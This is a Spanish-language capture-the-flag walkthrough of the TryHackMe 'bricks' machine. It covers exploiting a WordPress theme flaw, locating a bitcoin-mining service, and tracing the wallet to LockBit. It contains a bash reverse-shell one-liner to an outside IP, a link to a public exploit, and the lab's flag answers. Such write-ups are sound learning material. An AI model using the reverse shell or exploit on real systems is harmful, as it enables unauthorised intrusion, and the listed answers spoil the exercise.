@@ -1,0 +1,92 @@
+url: https://bricks.thm
+
+el nmap arrojo que habia 4 puertos abiertos: 22,443,80,3060.
+
+Al revisar el puerto 80 no habia nada relevante, solo habia una pagina con un texto de error, pero al revisar el 443 accedi a un sitio web wordpress el cual usaba una platilla con
+una vulnerbilidadla cual no permitia conseguir una reverse shell, la cual pude conseguri gracias a que lei en un blog sobre la vulnerabilidad.
+https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
+
+Usuario accedio: Apache 
+
+Use un comando para tener una shell mas estable al ejecutar ciertos comandos.
+bash -c 'exec bash -i &>/dev/tcp/10.2.25.89/1200 <&1'
+
+Hallazgos:
+Archivo 650c844110baced87e1606453b93f22a.txt
+
+En el archvio 650c844110baced87e1606453b93f22a.txt encontre la respuesta de la primera pregunta.
+Respuesta: THM{fl46_650c844110baced87e1606453b93f22a}
+
+Durante el proceso me encontre con varios archivos interesantes a los cuales creo que se le pudieron sacar provecho para conseguir ciertas credenciales hacer eso no me ayudaba a responder 
+las preguntas, meintras tanto eso recorde que habia en la descripcion de la maquina decia algo de los servicios asi que decidi listar los servicios que estaban corriendo en la maquina
+
+ps aux
+
+pero ese comando no me arrojo algo en lo cual pudiera identificar de utilidad, leyendo el blog que me encontre me dieron otro comando mas util en el cual podia filtrar de mejor manera los
+servicios y era el siguiente
+
+systemctl list-units --type=service --state=running
+
+el cual me arrojo informacion mas ordenada y en el cual me pude percatar de un servicio ejecutado por el usuario ubuntu el cual se veia asi.
+
+ubuntu.service loaded active running TRYHACK3M
+
+El cual al hacerle un systemctl status al servicio me dio cierta informacion.
+
+CGroup: /system.slice/ubuntu.service
+             ├─2823 /lib/NetworkManager/nm-inet-dialog
+             └─2824 /lib/NetworkManager/nm-inet-dialog
+
+Con el nombre del servicio respondi la segunda pregunta:
+Respuesta: nm-inet-dialog
+
+Tambien me ayudo a resolver la tercera pregunta:
+Respuesta: ubuntu.service
+
+Al revisar el directorio donde se alojaba este servicio encontre varios archivos usando el comando de ls -la entre ellos uno llamado
+
+Archvio inet.conf 
+
+Que tambien me ayudo a responder la cuarta pregunta
+
+Respuesta: inet.conf
+
+En el cual contenia un log sobre una mineria de bitcoin y tambien en el archivo aparecia la direccion de la wallet pero cifrada(bueno creo que no estaba cifrada pero x), para conseguir la 
+direccion de la wallet en el blog me decia usara una pagina para decifrar la direccion.
+
+https://gchq.github.io/CyberChef/
+
+En la cual meti la direccion que encontre en el log
+
+Direccion log: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
+
+La cual al meterla en la pagina y picarle en la barita magica que hay en la parte de la salida me arrojo la direccion pero como este campo era completamente para mi sobre este tipo de 
+vulnerabilidades me puse a leer el blog y segun esto decia que la direccion que solto no era completamente valida ya que son de 22 a 62 caracteres y no complua con esto entonces dividi la
+direccion en 2 ya que empieza con bc pero en la mitad del texto hay otro bc y supuse que era del prefijo de la moneda y por eso hice eso.
+
+Direccion: bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+
+Direccion1: bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+Direccion2: bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
+
+En el mismo blog decia que usara una pagina para comprobar su validez:
+https://blockchair.com/
+
+En la cual encontre que la primera era la valida y tambien era la respuesta a la quinta pregunta, al buscar la direccion en la misma pagina tambien me dio historiales de transacciones de 
+la misma cuenta y de la cuenta a la cual recibi y enviaba el dinero, leyendo el blog decia que en la misma pagina decia que era posible rastrear a un de las personas que recibio o mando
+el dinero y de eso no me percate, la direccion era la siguiente.
+
+id de la transaccion: 50a89a628a6620216dca19f1221c138982601810fd60677ac7612a01999ae028
+
+Direccion del que envio: bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r
+
+Recipiente?:  bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
+
+Se me ocurrio buscar mas infromacion de estas direcciones en la pagina pero no encontre nada y al final tuve que ver en el blog que buscandola en google encontrabas resultados sobre las
+direccion lo cual no crei porque segun son seguras y no es en si muy facil exponer a los destinatarioes pero en esta ocasion si encontre el nombre del destinatario o receptor en una pagina
+del gobierno de estados unidos.
+https://ofac.treasury.gov/recent-actions/20240220
+
+En el cual decian que la direccion era de un grupo de hackers llamado lockbit y dando la ultima respuesta de la maquina.
+Respuesta6: Lockbit
+
